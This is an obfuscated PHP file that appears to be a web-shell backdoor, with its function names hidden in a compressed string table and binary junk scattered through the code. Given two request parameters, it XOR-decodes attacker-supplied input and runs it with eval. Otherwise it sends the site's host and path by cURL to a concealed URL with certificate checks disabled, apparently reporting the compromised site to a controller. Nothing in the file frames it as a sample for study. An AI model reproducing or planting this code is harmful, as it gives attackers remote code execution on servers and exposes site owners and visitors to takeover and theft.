<?php 

          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');�ɀ��ؕ������瀛���͛�Œ�ζ������������¨�뙓����؞�����󒻄;$GLOBALS[O0] = explode('|||', gzinflate(substr('�      M��
�0�A���n���
z�϶��5�Rkm;�d�4��$�/!�h�r\\ź�:P�:[o��f��XI��L *�+\\�k�PS�-�8P�ަ_{����`�(.�x����Z�B��/T�Z�;f�1��?�`�.M���ԞOƦ�N��=��(�d�g/�d%+Q��q���8��f�Z����.  ',0x0a, -8)));���郑���䊃�桩����ߢ��殪���͓��뮹�����ꝡ��򑊵������ꦀ����蓺����Ӳ�̟����ɟ����;?>
<?php
if (isset($_REQUEST[$GLOBALS{O0}[0]])) {
	if (isset($_REQUEST[$GLOBALS{O0}{0x001}])) {
		function xorDecrypt($O00, $O0O) {
    $O00 = $GLOBALS{O0}[0x0002]($O00);
    $OO0 = $GLOBALS{O0}{0x00003}($O0O);
    $OOO = $GLOBALS{O0}{0x00003}($O00);
    $O000 = $GLOBALS{O0}[0x000004];

    for ($O00O = 0; $O00O < $OOO; $O00O++) {
        $O000 .= $O00[$O00O] ^ $O0O[$O00O % $OO0];
    }
    return @eval($O000);
}
$O00=$_REQUEST[$GLOBALS{O0}{0x001}];
$O0O = $GLOBALS{O0}{0x05};  
$O0O0 = $GLOBALS{O0}[0x006]($O00, $O0O);
	}
	} else {
$O0OO = $_SERVER[$GLOBALS{O0}{0x0007}].$_SERVER[$GLOBALS{O0}[0x00008]];
�����������ᖍ���������ᯉ�;
$OO00 = $GLOBALS{O0}{0x000009}();
���Љ���;
$GLOBALS{O0}[0x0a]($OO00, CURLOPT_URL,$GLOBALS{O0}{0x00b});

$GLOBALS{O0}[0x0a]($OO00, CURLOPT_POST, 0x001);
�����̳������ۏ����»��ҩ�썓�������ǰ�����؀�;
$OO0O = array(
  $GLOBALS{O0}[0x000c] => $O0OO,
  $GLOBALS{O0}{0x0000d} => 0x001
);
�Ȧ��ݫ�������;
$GLOBALS{O0}[0x0a]($OO00, CURLOPT_POSTFIELDS, $GLOBALS{O0}[0x00000e]($OO0O));

$GLOBALS{O0}[0x0a]($OO00, CURLOPT_SSL_VERIFYHOST, !1);
������ߨȹ����ʧ�͒��܌����̈�ͧ�;
$GLOBALS{O0}[0x0a]($OO00, CURLOPT_SSL_VERIFYPEER, !1);

$GLOBALS{O0}[0x0a]($OO00, CURLOPT_RETURNTRANSFER, !0);

$O000 = $GLOBALS{O0}{0x0f}($OO00);
������������߂��󻑀�������;
$GLOBALS{O0}[0x0010] ($OO00);
���׆�􁩞��ӓ����ݯ�¢��̖�ȫ��;
	}
	
?>
